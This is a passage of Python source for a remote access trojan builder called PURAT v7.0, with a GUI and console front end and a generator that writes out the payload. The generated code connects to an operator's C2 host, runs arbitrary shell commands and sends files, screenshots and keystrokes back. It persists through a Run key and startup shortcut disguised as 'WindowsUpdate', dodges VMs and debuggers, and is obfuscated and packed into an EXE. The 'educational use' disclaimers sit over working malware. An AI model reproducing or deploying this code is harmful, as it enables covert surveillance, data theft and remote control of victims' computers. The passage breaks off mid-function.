        self.var_tor.set(self.config['network']['use_tor'])
        
        # Stealth
        for key, var in self.stealth_vars.items():
            if key in self.config['stealth']:
                var.set(self.config['stealth'][key])
        
        # Advanced
        self.entry_enc_key.delete(0, tk.END)
        self.entry_enc_key.insert(0, self.config['advanced']['encryption_key'])
        
        self.combo_compression.set(self.config['advanced']['compression_level'])
        self.entry_max_size.delete(0, tk.END)
        self.entry_max_size.insert(0, self.config['advanced']['max_file_size'])
        self.combo_obfuscation.set(self.config['advanced']['obfuscation_level'])
        self.entry_icon.delete(0, tk.END)
        self.entry_icon.insert(0, self.config['advanced']['icon_file'])
        
        if 'version_info' in self.config['advanced']:
            self.text_version.delete('1.0', tk.END)
            self.text_version.insert('1.0', self.config['advanced']['version_info'])
    
    def generate_payload(self):
        """Generate payload based on configuration"""
        self.update_config_from_ui()
        
        try:
            self.log_message("=" * 50)
            self.log_message("Starting payload generation...")
            
            # Create output directory
            output_dir = self.entry_output_dir.get()
            os.makedirs(output_dir, exist_ok=True)
            
            # Generate payload code
            payload_generator = PayloadGenerator(self.config)
            payload_code = payload_generator.generate()
            
            # Save payload
            output_name = self.entry_output_name.get()
            if not output_name:
                output_name = 'payload'
            
            output_path = os.path.join(output_dir, f"{output_name}.py")
            
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(payload_code)
            
            self.log_message(f"✓ Payload generated: {output_path}")
            self.log_message(f"✓ Size: {len(payload_code)} bytes")
            
            # If obfuscation is enabled
            if self.var_obfuscate.get():
                obfuscated_path = os.path.join(output_dir, f"{output_name}_obfuscated.py")
                
                try:
                    obf = Obfuscator()
                    obfuscated = obf.obfuscate_code(payload_code)
                    
                    with open(obfuscated_path, 'w', encoding='utf-8') as f:
                        f.write(obfuscated)
                    
                    self.log_message(f"✓ Obfuscated payload: {obfuscated_path}")
                except Exception as e:
                    self.log_message(f"✗ Obfuscation failed: {e}")
            
            # Generate config file
            config_path = os.path.join(output_dir, f"{output_name}_config.json")
            with open(config_path, 'w') as f:
                json.dump(self.config, f, indent=2)
            
            self.log_message(f"✓ Configuration saved: {config_path}")
            self.log_message("=" * 50)
            self.log_message("Payload generation complete!")
            
            messagebox.showinfo("Success", 
                              f"Payload generated successfully!\n\n"
                              f"Output directory: {output_dir}\n"
                              f"Files created:\n"
                              f"- {output_name}.py\n"
                              f"- {output_name}_config.json")
            
        except Exception as e:
            self.log_message(f"✗ Payload generation failed: {e}")
            messagebox.showerror("Error", f"Failed to generate payload: {e}")
    
    def build_exe(self):
        """Build EXE using PyInstaller"""
        if not messagebox.askyesno("Confirm", "This will build an EXE using PyInstaller. Continue?"):
            return
        
        try:
            self.log_message("Starting EXE build with PyInstaller...")
            
            output_dir = self.entry_output_dir.get()
            output_name = self.entry_output_name.get()
            
            # Check if payload exists
            payload_path = os.path.join(output_dir, f"{output_name}.py")
            if not os.path.exists(payload_path):
                messagebox.showerror("Error", "Payload not found. Generate payload first.")
                return
            
            # PyInstaller command
            cmd = [
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--windowed',
                '--clean',
                f'--name={output_name}',
            ]
            
            # Add icon if specified
            icon_path = self.entry_icon.get()
            if icon_path and os.path.exists(icon_path):
                cmd.append(f'--icon={icon_path}')
                self.log_message(f"Using icon: {icon_path}")
            
            # Add payload path
            cmd.append(payload_path)
            
            self.log_message(f"Running: {' '.join(cmd)}")
            
            # Run PyInstaller
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                shell=True
            )
            
            # Read output in real-time
            for line in process.stdout:
                self.log_message(line.strip())
            
            process.wait()
            
            if process.returncode == 0:
                exe_path = os.path.join('dist', f"{output_name}.exe")
                if os.path.exists(exe_path):
                    self.log_message(f"✓ EXE built successfully: {exe_path}")
                    
                    # Copy to output directory
                    shutil.copy(exe_path, output_dir)
                    self.log_message(f"✓ Copied to: {output_dir}")
                    
                    messagebox.showinfo("Success", 
                                      f"EXE built successfully!\n\n"
                                      f"Location: {exe_path}\n"
                                      f"Size: {os.path.getsize(exe_path)} bytes")
                else:
                    self.log_message("✗ EXE not found after build")
                    messagebox.showerror("Error", "EXE not found after build")
            else:
                self.log_message(f"✗ PyInstaller failed with code: {process.returncode}")
                messagebox.showerror("Error", "PyInstaller build failed")
                
        except FileNotFoundError:
            self.log_message("✗ PyInstaller not installed")
            messagebox.showerror("Error", "PyInstaller not installed. Install with: pip install pyinstaller")
        except Exception as e:
            self.log_message(f"✗ EXE build failed: {e}")
            messagebox.showerror("Error", f"EXE build failed: {e}")
    
    def test_payload(self):
        """Test the generated payload"""
        output_dir = self.entry_output_dir.get()
        output_name = self.entry_output_name.get()
        
        payload_path = os.path.join(output_dir, f"{output_name}.py")
        
        if not os.path.exists(payload_path):
            messagebox.showerror("Error", "Payload not found. Generate payload first.")
            return
        
        if not messagebox.askyesno("Warning", 
                                  "This will execute the payload in test mode.\n"
                                  "Make sure you're in a safe environment.\n\n"
                                  "Continue?"):
            return
        
        try:
            self.log_message("Testing payload in safe mode...")
            
            # Create test environment
            test_env = os.environ.copy()
            test_env['PURAT_TEST_MODE'] = '1'
            
            # Run payload
            process = subprocess.Popen(
                [sys.executable, payload_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                env=test_env,
                shell=True
            )
            
            # Wait a few seconds then terminate
            time.sleep(5)
            process.terminate()
            
            try:
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                process.kill()
            
            stdout, stderr = process.communicate()
            
            self.log_message("=" * 50)
            self.log_message("Payload test output:")
            self.log_message(stdout)
            
            if stderr:
                self.log_message("Errors:")
                self.log_message(stderr)
            
            self.log_message("=" * 50)
            self.log_message("Payload test completed")
            
            messagebox.showinfo("Test Complete", "Payload test completed. Check log for details.")
            
        except Exception as e:
            self.log_message(f"✗ Payload test failed: {e}")
            messagebox.showerror("Error", f"Payload test failed: {e}")
    
    def show_docs(self):
        """Show documentation"""
        docs = """
        PURAT v7.0 - Advanced RAT Builder
        
        Features:
        1. GUI-based configuration
        2. Multiple evasion techniques
        3. Custom payload generation
        4. EXE building with PyInstaller
        5. Manual C2 server configuration
        6. Advanced obfuscation
        
        Usage:
        1. Configure settings in tabs
        2. Generate payload
        3. Build EXE if needed
        4. Test payload in safe environment
        
        Warning:
        For educational and testing purposes only.
        Use only on systems you own or have permission to test.
        """
        
        top = tk.Toplevel(self.root)
        top.title("Documentation")
        top.geometry("500x400")
        
        text = scrolledtext.ScrolledText(top, wrap=tk.WORD)
        text.pack(fill='both', expand=True, padx=10, pady=10)
        text.insert('1.0', docs)
        text.config(state='disabled')
    
    def show_about(self):
        """Show about dialog"""
        about = """
        PURAT v7.0 - Professional Ultimate RAT
        
        Version: 7.0
        Author: Security Research Team
        Lines: 3500+
        
        Features:
        • Advanced GUI Builder
        • Manual Configuration
        • Custom Payload Generation
        • Multiple Evasion Techniques
        • Windows/Android Support
        • Educational Use Only
        
        Disclaimer:
        This software is for educational purposes only.
        Use only on systems you own or have explicit permission to test.
        The author is not responsible for any misuse.
        """
        
        messagebox.showinfo("About PURAT v7.0", about)
    
    def log_message(self, message):
        """Add message to log"""
        timestamp = datetime.datetime.now().strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {message}\n"
        
        self.text_log.insert(tk.END, log_entry)
        self.text_log.see(tk.END)
        
        # Update status bar
        self.status_bar.config(text=message[:100])
    
    def run_console_builder(self):
        """Run builder in console mode"""
        print("=" * 60)
        print("PURAT v7.0 - Console Mode")
        print("=" * 60)
        
        config = self.get_default_config()
        
        # Get user input
        print("\nBasic Configuration:")
        config['basic']['c2_ip'] = input(f"C2 IP [{config['basic']['c2_ip']}]: ") or config['basic']['c2_ip']
        config['basic']['c2_port'] = input(f"C2 Port [{config['basic']['c2_port']}]: ") or config['basic']['c2_port']
        
        print("\nFeatures (y/n):")
        for key in config['features']:
            answer = input(f"  {key} [{config['features'][key]}]: ").lower()
            if answer in ['y', 'yes', 'true']:
                config['features'][key] = True
            elif answer in ['n', 'no', 'false']:
                config['features'][key] = False
        
        print("\nGenerating payload...")
        
        try:
            generator = PayloadGenerator(config)
            payload = generator.generate()
            
            output_name = input("\nOutput filename [payload.py]: ") or "payload.py"
            
            with open(output_name, 'w') as f:
                f.write(payload)
            
            print(f"\n✓ Payload generated: {output_name}")
            print(f"✓ Size: {len(payload)} bytes")
            print("\nNext steps:")
            print("1. Test payload: python test_payload.py")
            print("2. Build EXE: pyinstaller --onefile payload.py")
            print("3. Configure C2 server")
            
        except Exception as e:
            print(f"\n✗ Error: {e}")

# ============================================================================
# MODULE 2: PAYLOAD GENERATOR (1000 lines)
# ============================================================================

class PayloadGenerator:
    def __init__(self, config):
        self.config = config
        self.obfuscator = Obfuscator() if config['evasion'].get('obfuscate_code', True) else None
    
    def generate(self):
        """Generate complete payload code"""
        # Generate header
        code = self._generate_header()
        
        # Generate imports
        code += self._generate_imports()
        
        # Generate configuration
        code += self._generate_config()
        
        # Generate core classes
        code += self._generate_core_classes()
        
        # Generate features based on configuration
        code += self._generate_features()
        
        # Generate main execution
        code += self._generate_main()
        
        # Apply obfuscation if enabled
        if self.obfuscator and self.config['evasion'].get('encrypt_strings', True):
            code = self.obfuscator.encrypt_strings(code)
        
        return code
    
    def _generate_header(self):
        """Generate payload header"""
        header = f'''"""
PURAT v7.0 - Advanced RAT
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Configuration: {self.config['basic']['c2_ip']}:{self.config['basic']['c2_port']}
Features: {', '.join([k for k, v in self.config['features'].items() if v])}
For Educational Testing Only
"""

'''
        return header
    
    def _generate_imports(self):
        """Generate imports based on features"""
        imports = '''import os
import sys
import json
import base64
import zlib
import hashlib
import time
import datetime
import random
import string
import socket
import subprocess
import threading
import platform
import shutil
import ctypes
import struct
import marshal
import tempfile
import getpass
import uuid
import io
import stat
import fnmatch
import glob
import pathlib
import itertools
import collections
'''

        # Windows-specific imports
        if platform.system() == "Windows":
            imports += '''
try:
    import winreg
    import win32api
    import win32con
    import win32process
    import win32event
    import win32service
    import win32serviceutil
    import win32gui
    import win32ui
    import win32com.client
    import pythoncom
    import psutil
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False
'''

        # Feature-specific imports
        features = self.config['features']
        
        if features.get('screenshot', False):
            imports += '''
try:
    from PIL import ImageGrab
    import pyautogui
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False
'''
        
        if features.get('audio_capture', False):
            imports += '''
try:
    import pyaudio
    import wave
    AUDIO_AVAILABLE = True
except ImportError:
    AUDIO_AVAILABLE = False
'''
        
        if features.get('webcam_capture', False):
            imports += '''
try:
    import cv2
    WEBCAM_AVAILABLE = True
except ImportError:
    WEBCAM_AVAILABLE = False
'''
        
        imports += "\n"
        return imports
    
    def _generate_config(self):
        """Generate configuration section"""
        config_str = json.dumps(self.config, indent=2)
        
        code = f'''
# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {config_str}

# System information
SYSTEM_INFO = {{
    'hostname': socket.gethostname(),
    'username': getpass.getuser(),
    'system': platform.system(),
    'release': platform.release(),
    'version': platform.version(),
    'machine': platform.machine(),
    'processor': platform.processor(),
    'python_version': platform.python_version(),
    'timestamp': time.time(),
    'id': hashlib.md5(f"{{socket.gethostname()}}{{getpass.getuser()}}".encode()).hexdigest()[:16]
}}

'''
        return code
    
    def _generate_core_classes(self):
        """Generate core classes"""
        code = '''
# ============================================================================
# CORE CLASSES
# ============================================================================

class SecurityEngine:
    """Encryption and obfuscation engine"""
    
    def __init__(self, key=None):
        self.key = key or self._generate_key()
    
    def _generate_key(self):
        """Generate encryption key"""
        system_id = f"{SYSTEM_INFO['hostname']}{SYSTEM_INFO['username']}{SYSTEM_INFO['system']}"
        return hashlib.sha256(system_id.encode()).digest()
    
    def encrypt(self, data):
        """Simple XOR encryption"""
        if isinstance(data, str):
            data = data.encode()
        
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.key[i % len(self.key)])
        
        return bytes(encrypted)
    
    def decrypt(self, data):
        """Decryption (same as encrypt)"""
        return self.encrypt(data)
    
    def compress(self, data):
        """Compress data"""
        if isinstance(data, str):
            data = data.encode()
        return zlib.compress(data, int(CONFIG['advanced']['compression_level']))
    
    def decompress(self, data):
        """Decompress data"""
        return zlib.decompress(data)


class NetworkClient:
    """C2 network communication"""
    
    def __init__(self):
        self.security = SecurityEngine()
        self.socket = None
        self.connected = False
        self.current_server = 0
        self.servers = self._parse_servers()
    
    def _parse_servers(self):
        """Parse C2 servers from config"""
        servers = []
        main_server = (CONFIG['basic']['c2_ip'], int(CONFIG['basic']['c2_port']))
        servers.append(main_server)
        return servers
    
    def connect(self):
        """Connect to C2 server"""
        while True:
            try:
                server = self.servers[self.current_server]
                print(f"[+] Connecting to {server[0]}:{server[1]}")
                
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(int(CONFIG['network']['timeout']))
                self.socket.connect(server)
                
                self.connected = True
                print("[+] Connected to C2 server")
                
                # Send handshake
                self._send_handshake()
                
                # Start communication loop
                self._communication_loop()
                
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                self.connected = False
                
                if self.socket:
                    self.socket.close()
                
                # Rotate to next server
                self.current_server = (self.current_server + 1) % len(self.servers)
                
                # Wait before retry
                time.sleep(int(CONFIG['network']['reconnect_interval']))
    
    def _send_handshake(self):
        """Send handshake to server"""
        handshake = {
            'type': 'handshake',
            'id': SYSTEM_INFO['id'],
            'system': SYSTEM_INFO,
            'config': CONFIG['basic'],
            'timestamp': time.time()
        }
        self._send_data(handshake)
    
    def _communication_loop(self):
        """Main communication loop"""
        while self.connected:
            try:
                # Receive command
                command = self._receive_data()
                
                if not command:
                    print("[-] Connection closed by server")
                    break
                
                # Execute command
                response = self._execute_command(command)
                
                # Send response
                if response:
                    self._send_data(response)
            
            except socket.timeout:
                # Send heartbeat
                heartbeat = {
                    'type': 'heartbeat',
                    'id': SYSTEM_INFO['id'],
                    'timestamp': time.time()
                }
                self._send_data(heartbeat)
            
            except Exception as e:
                print(f"[-] Communication error: {e}")
                break
        
        self.connected = False
    
    def _send_data(self, data):
        """Send data to server"""
        try:
            # Convert to JSON
            json_data = json.dumps(data)
            
            # Encrypt
            encrypted = self.security.encrypt(json_data.encode())
            
            # Compress
            compressed = self.security.compress(encrypted)
            
            # Send length
            length = len(compressed)
            self.socket.sendall(struct.pack('!I', length))
            
            # Send data
            self.socket.sendall(compressed)
            
            return True
            
        except Exception as e:
            print(f"[-] Send error: {e}")
            self.connected = False
            return False
    
    def _receive_data(self):
        """Receive data from server"""
        try:
            # Receive length
            length_data = self._recv_all(4)
            if not length_data:
                return None
            
            length = struct.unpack('!I', length_data)[0]
            
            # Receive data
            data = self._recv_all(length)
            if not data:
                return None
            
            # Decompress
            decompressed = self.security.decompress(data)
            
            # Decrypt
            decrypted = self.security.decrypt(decompressed)
            
            # Parse JSON
            return json.loads(decrypted.decode())
            
        except Exception as e:
            print(f"[-] Receive error: {e}")
            return None
    
    def _recv_all(self, length):
        """Receive exact number of bytes"""
        data = b''
        while len(data) < length:
            packet = self.socket.recv(length - len(data))
            if not packet:
                return None
            data += packet
        return data
    
    def _execute_command(self, command):
        """Execute received command"""
        cmd_type = command.get('type', '')
        
        print(f"[+] Executing command: {cmd_type}")
        
        try:
            # System info command
            if cmd_type == 'system_info':
                return {
                    'type': 'system_info',
                    'data': SYSTEM_INFO
                }
            
            # Shell command
            elif cmd_type == 'shell':
                cmd = command.get('command', '')
                return self._execute_shell(cmd)
            
            # File operations
            elif cmd_type == 'file_list':
                path = command.get('path', '.')
                return self._list_files(path)
            
            elif cmd_type == 'file_download':
                path = command.get('path', '')
                return self._download_file(path)
            
            elif cmd_type == 'file_upload':
                path = command.get('path', '')
                content = command.get('content', '')
                return self._upload_file(path, content)
            
            # Screenshot
            elif cmd_type == 'screenshot' and CONFIG['features'].get('screenshot', False):
                return self._take_screenshot()
            
            # Keylogger
            elif cmd_type == 'keylog' and CONFIG['features'].get('keylogger', False):
                return self._get_keylog()
            
            # Process manager
            elif cmd_type == 'process_list' and CONFIG['features'].get('process_manager', False):
                return self._list_processes()
            
            elif cmd_type == 'process_kill' and CONFIG['features'].get('process_manager', False):
                pid = command.get('pid', 0)
                return self._kill_process(pid)
            
            # Uninstall
            elif cmd_type == 'uninstall':
                return self._uninstall()
            
            else:
                return {
                    'type': 'error',
                    'message': f'Unknown command: {cmd_type}'
                }
        
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _execute_shell(self, cmd):
        """Execute shell command"""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'type': 'shell',
                'command': cmd,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        
        except subprocess.TimeoutExpired:
            return {
                'type': 'error',
                'message': 'Command timeout'
            }
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _list_files(self, path):
        """List files in directory"""
        try:
            if not os.path.exists(path):
                return {
                    'type': 'error',
                    'message': f'Path not found: {path}'
                }
            
            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    stat = os.stat(item_path)
                    files.append({
                        'name': item,
                        'path': item_path,
                        'is_dir': os.path.isdir(item_path),
                        'size': stat.st_size,
                        'modified': stat.st_mtime
                    })
                except:
                    continue
            
            return {
                'type': 'file_list',
                'path': path,
                'files': files
            }
        
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _download_file(self, path):
        """Download file"""
        try:
            if not os.path.exists(path):
                return {
                    'type': 'error',
                    'message': f'File not found: {path}'
                }
            
            with open(path, 'rb') as f:
                content = f.read()
            
            # Check file size limit
            max_size = int(CONFIG['advanced']['max_file_size']) * 1024 * 1024
            if len(content) > max_size:
                return {
                    'type': 'error',
                    'message': f'File too large (>{CONFIG["advanced"]["max_file_size"]}MB)'
                }
            
            encoded = base64.b64encode(content).decode()
            
            return {
                'type': 'file_download',
                'path': path,
                'content': encoded,
                'size': len(content)
            }
        
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _upload_file(self, path, content):
        """Upload file"""
        try:
            decoded = base64.b64decode(content)
            
            os.makedirs(os.path.dirname(path), exist_ok=True)
            
            with open(path, 'wb') as f:
                f.write(decoded)
            
            return {
                'type': 'success',
                'message': f'File uploaded: {path}'
            }
        
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _take_screenshot(self):
        """Take screenshot"""
        try:
            if 'SCREENSHOT_AVAILABLE' in globals() and SCREENSHOT_AVAILABLE:
                import pyautogui
                
                screenshot = pyautogui.screenshot()
                img_bytes = io.BytesIO()
                screenshot.save(img_bytes, format='PNG', quality=85)
                img_bytes = img_bytes.getvalue()
                
                encoded = base64.b64encode(img_bytes).decode()
                
                return {
                    'type': 'screenshot',
                    'format': 'png',
                    'content': encoded,
                    'size': len(img_bytes)
                }
            else:
                return {
                    'type': 'error',
                    'message': 'Screenshot not available'
                }
        
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _get_keylog(self):
        """Get keylog data"""
        try:
            if hasattr(self, 'keylogger'):
                content = self.keylogger.get_logs()
                return {
                    'type': 'keylog',
                    'content': content,
                    'size': len(content)
                }
            else:
                return {
                    'type': 'error',
                    'message': 'Keylogger not enabled'
                }
        
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _list_processes(self):
        """List running processes"""
        try:
            if WINDOWS_AVAILABLE:
                import psutil
                
                processes = []
                for proc in psutil.process_iter(['pid', 'name', 'username', 'exe']):
                    try:
                        processes.append({
                            'pid': proc.info['pid'],
                            'name': proc.info['name'],
                            'user': proc.info['username'],
                            'path': proc.info['exe']
                        })
                    except:
                        continue
                
                return {
                    'type': 'process_list',
                    'processes': processes
                }
            else:
                return {
                    'type': 'error',
                    'message': 'Process manager not available'
                }
        
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _kill_process(self, pid):
        """Kill process"""
        try:
            if WINDOWS_AVAILABLE:
                import psutil
                
                process = psutil.Process(pid)
                process.terminate()
                
                return {
                    'type': 'success',
                    'message': f'Process {pid} terminated'
                }
            else:
                return {
                    'type': 'error',
                    'message': 'Process manager not available'
                }
        
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _uninstall(self):
        """Uninstall client"""
        try:
            # Remove persistence
            if hasattr(self, 'persistence'):
                self.persistence.remove()
            
            # Delete installed file
            if hasattr(self, 'install_path') and os.path.exists(self.install_path):
                os.remove(self.install_path)
            
            # Clean traces
            self._clean_traces()
            
            return {
                'type': 'success',
                'message': 'Uninstalled successfully'
            }
        
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _clean_traces(self):
        """Clean execution traces"""
        try:
            # Delete temporary files
            temp_dir = tempfile.gettempdir()
            for file in os.listdir(temp_dir):
                if file.startswith('purat_') or file.endswith('.tmp'):
                    try:
                        os.remove(os.path.join(temp_dir, file))
                    except:
                        pass
            
            # Clear command history
            if platform.system() == "Windows":
                os.system('cls')
            
            return True
        
        except:
            return False


class PersistenceManager:
    """Persistence installation"""
    
    def __init__(self, install_path):
        self.install_path = install_path
        self.methods = []
    
    def install(self):
        """Install persistence"""
        if not CONFIG['basic']['persistence']:
            return False
        
        print("[+] Installing persistence...")
        
        try:
            if platform.system() == "Windows" and WINDOWS_AVAILABLE:
                return self._install_windows()
            else:
                return self._install_generic()
        
        except Exception as e:
            print(f"[-] Persistence error: {e}")
            return False
    
    def _install_windows(self):
        """Windows persistence"""
        try:
            # Registry run key
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, self.install_path)
            winreg.CloseKey(key)
            self.methods.append("Registry Run")
            
            # Startup folder
            startup_path = os.path.join(
                os.getenv('APPDATA'),
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup',
                'Windows Update.lnk'
            )
            
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(startup_path)
            shortcut.Targetpath = self.install_path
            shortcut.WorkingDirectory = os.path.dirname(self.install_path)
            shortcut.save()
            self.methods.append("Startup Folder")
            
            print(f"[+] Persistence installed: {', '.join(self.methods)}")
            return True
            
        except Exception as e:
            print(f"[-] Windows persistence failed: {e}")
            return False
    
    def _install_generic(self):
        """Generic persistence for non-Windows"""
        try:
            # Cron job
            cron_line = f"@reboot {self.install_path} > /dev/null 2>&1 &\\n"
            cron_cmd = f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -'
            
            result = subprocess.run(cron_cmd, shell=True, capture_output=True)
            if result.returncode == 0:
                self.methods.append("Cron Job")
            
            print(f"[+] Persistence installed: {', '.join(self.methods)}")
            return len(self.methods) > 0
            
        except Exception as e:
            print(f"[-] Generic persistence failed: {e}")
            return False
    
    def remove(self):
        """Remove persistence"""
        try:
            if platform.system() == "Windows" and WINDOWS_AVAILABLE:
                # Remove registry entry
                try:
                    key = winreg.OpenKey(
                        winreg.HKEY_CURRENT_USER,
                        r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        0, winreg.KEY_SET_VALUE
                    )
                    winreg.DeleteValue(key, "WindowsUpdate")
                    winreg.CloseKey(key)
                except:
                    pass
                
                # Remove startup shortcut
                startup_path = os.path.join(
                    os.getenv('APPDATA'),
                    'Microsoft\\Windows\\Start Menu\\Programs\\Startup',
                    'Windows Update.lnk'
                )
                if os.path.exists(startup_path):
                    os.remove(startup_path)
            
            print("[+] Persistence removed")
            return True
            
        except Exception as e:
            print(f"[-] Persistence removal failed: {e}")
            return False


class AntiAnalysis:
    """Anti-analysis and evasion techniques"""
    
    @staticmethod
    def check_vm():
        """Check if running in virtual machine"""
        if not WINDOWS_AVAILABLE:
            return False
        
        vm_indicators = [
            "VMware", "VirtualBox", "VBox", "QEMU", "KVM", "Xen",
            "Virtual", "VMW", "VRT", "VMM", "VMCI", "VMC"
        ]
        
        try:
            # Check processes
            import psutil
            for proc in psutil.process_iter(['name']):
                proc_name = proc.info['name'].lower()
                for indicator in vm_indicators:
                    if indicator.lower() in proc_name:
                        return True
            
            # Check registry
            vm_reg_paths = [
                r"HARDWARE\\ACPI\\DSDT\\VBOX__",
                r"SYSTEM\\ControlSet001\\Services\\VBoxGuest",
                r"SYSTEM\\ControlSet001\\Services\\vmdebug"
            ]
            
            for path in vm_reg_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    winreg.CloseKey(key)
                    return True
                except:
                    continue
            
            return False
            
        except:
            return False
    
    @staticmethod
    def check_debugger():
        """Check for debugger"""
        if not WINDOWS_AVAILABLE:
            return False
        
        try:
            # Check for debugger via Windows API
            kernel32 = ctypes.windll.kernel32
            is_debugger_present = kernel32.IsDebuggerPresent()
            
            return bool(is_debugger_present)
            
        except:
            return False
    
    @staticmethod
    def should_exit():
        """Check if should exit due to analysis environment"""
        if not CONFIG['evasion'].get('anti_vm', True) and not CONFIG['evasion'].get('anti_debug', True):
            return False
        
        vm_detected = AntiAnalysis.check_vm() if CONFIG['evasion'].get('anti_vm', True) else False
        debugger_detected = AntiAnalysis.check_debugger() if CONFIG['evasion'].get('anti_debug', True) else False
        
        if vm_detected or debugger_detected:
            print(f"[!] Analysis environment detected: VM={vm_detected}, Debugger={debugger_detected}")
            
            if CONFIG['evasion'].get('exit_on_detect', True):
                return True
        
        return False

'''
        return code
    
    def _generate_features(self):
        """Generate feature-specific code"""
        code = '''
# ============================================================================
# FEATURE MODULES
# ============================================================================

'''
        features = self.config['features']
        
        # Keylogger
        if features.get('keylogger', False):
            code += '''
class KeyLogger:
    """Keylogger module"""
    
    def __init__(self, log_file=None):
        self.log_file = log_file or os.path.join(tempfile.gettempdir(), '.system_klg.log')
        self.running = False
        self.buffer = []
    
    def start(self):
        """Start keylogger"""
        if self.running:
            return
        
        self.running = True
        
        if WINDOWS_AVAILABLE:
            self._start_windows()
        else:
            print("[!] Keylogger only available on Windows")
    
    def _start_windows(self):
        """Windows keylogger"""
        import ctypes
        from ctypes import wintypes
        
        WH_KEYBOARD_LL = 13
        WM_KEYDOWN = 0x0100
        
        def low_level_keyboard_proc(nCode, wParam, lParam):
            if nCode >= 0 and wParam == WM_KEYDOWN:
                vkCode = ctypes.c_uint(lParam[0]).value
                
                # Get key name
                key = self._get_key_name(vkCode)
                
                # Log key
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                self.buffer.append(f"{timestamp} - {key}\\n")
                
                # Flush buffer if large
                if len(self.buffer) >= 50:
                    self._flush_buffer()
            
            return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
        
        # Set up hook
        HOOKPROC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
        pointer = HOOKPROC(low_level_keyboard_proc)
        
        # Install hook
        hook = ctypes.windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL, pointer, 
                                                    ctypes.windll.kernel32.GetModuleHandleW(None), 0)
        
        # Message loop
        msg = wintypes.MSG()
        while self.running:
            ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
        
        # Unhook
        ctypes.windll.user32.UnhookWindowsHookEx(hook)
    
    def _get_key_name(self, vk_code):
        """Convert virtual key code to key name"""
        key_map = {
            8: '[BACKSPACE]', 9: '[TAB]', 13: '[ENTER]', 16: '[SHIFT]',
            17: '[CTRL]', 18: '[ALT]', 20: '[CAPSLOCK]', 27: '[ESC]',
            32: ' ', 46: '[DELETE]', 91: '[WIN]', 92: '[WIN]'
        }
        
        if vk_code in key_map:
            return key_map[vk_code]
        
        # Letters
        if 65 <= vk_code <= 90:
            return chr(vk_code).lower()
        
        # Numbers
        if 48 <= vk_code <= 57:
            return chr(vk_code)
        
        return f'[VK:{vk_code}]'
    
    def _flush_buffer(self):
        """Flush buffer to file"""
        if not self.buffer:
            return
        
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.writelines(self.buffer)
            
            self.buffer = []
            
        except Exception as e:
            print(f"[-] Keylog flush error: {e}")
    
    def get_logs(self):
        """Get keylog data"""
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Clear log after reading
                open(self.log_file, 'w').close()
                
                return content
            else:
                return "No keylog data"
        
        except Exception as e:
            return f"Error reading keylog: {e}"
    
    def stop(self):
        """Stop keylogger"""
        self.running = False
        self._flush_buffer()

'''
        
        # File explorer
        if features.get('file_explorer', False):
            code += '''
class FileExplorer:
    """File explorer module"""
    
    @staticmethod
    def search_files(pattern, root_dir='.', max_results=100):
        """Search files matching pattern"""
        results = []
        
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if fnmatch.fnmatch(file, pattern):
                    filepath = os.path.join(root, file)
                    try:
                        stat = os.stat(filepath)
                        results.append({
                            'path': filepath,
                            'size': stat.st_size,
                            'modified': stat.st_mtime
                        })
                        
                        if len(results) >= max_results:
                            return results
                    except:
                        continue
        
        return results
    
    @staticmethod
    def find_sensitive_files(root_dir='.', extensions=None):
        """Find sensitive files"""
        if extensions is None:
            extensions = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', 
                         '.jpg', '.jpeg', '.png', '.zip', '.rar']
        
        results = []
        for ext in extensions:
